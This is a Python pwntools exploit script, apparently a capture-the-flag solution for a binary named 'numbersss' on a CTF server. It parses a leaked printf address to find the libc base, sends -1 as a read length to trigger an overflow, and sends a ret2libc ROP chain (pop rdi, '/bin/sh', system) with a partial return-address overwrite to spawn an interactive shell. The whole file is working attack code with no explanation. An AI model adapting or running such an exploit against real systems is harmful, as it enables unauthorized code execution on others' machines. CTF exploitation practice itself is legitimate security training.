#! /usr/bin/python3
from pwn import *
from string import ascii_letters

REMOTE = "nc numbersss.chal.cyberjousting.com 1351"
context.binary = elf = ELF("./numbersss")
context.timeout = Timeout.forever
context.log_console = sys.stderr
context.terminal = ["tmux", "splitw", "-h"]
# libc = ELF("/lib64/libc.so.6")
libc = ELF("./libc.so.6")


def main(bf=0):
    bf = bf # To shut up whatever Python syntax highlighter I use
    t = conn()

    t.recvuntil(b"Free junk: ")
    libc_leak = int(t.recvline(), 16)
    libc.address = libc_leak - libc.sym["printf"]

    info(f"LIBC: {libc.address:x}")
    sys_addr = p64(libc.sym["system"])
    bin_sh = p64(next(libc.search(b"/bin/sh\x00")))

    __import__("time").sleep(2)
    t.sendafter(b"read in?\n", str(-1).encode())

    pop_rdi = p64(libc.address + 0x00000000000240e5)

    exploit = flat(
            b"b",
            pop_rdi,
            bin_sh,
            sys_addr,
            b"A" * (0xf0-16),
            p8(0x82),
            )

    t.sendline(exploit)

    t.interactive()
    t.close()


# Handles a 'nc addr port' string like those provided in CTFs
def get_addr(s: str):
    s = s.strip().removeprefix('nc ')
    splitter = ':' if ':' in s else ' '
    addr = s.split(splitter)[0]
    port = int(s.split(splitter)[1])
    return (addr, port)


def conn() -> remote | process:
    if args.I or args.INFO or args.i or args.info:
        context.log_level = "info"
    else:
        context.log_level = "debug"

    if args.R or args.REMOTE or args.r or args.remote: # Remote host
        t = remote(*get_addr(REMOTE))
    else:
        t = process([elf.path])
        if args.G or args.GDB or args.g or args.gdb:
            gdb.attach(t, gdbscript="""
            b *0x0000000000401281
            c
            """)
    return t

# Bruteforcing setup 
for i in range(1):
    print(f"{i=}")
    main(i)
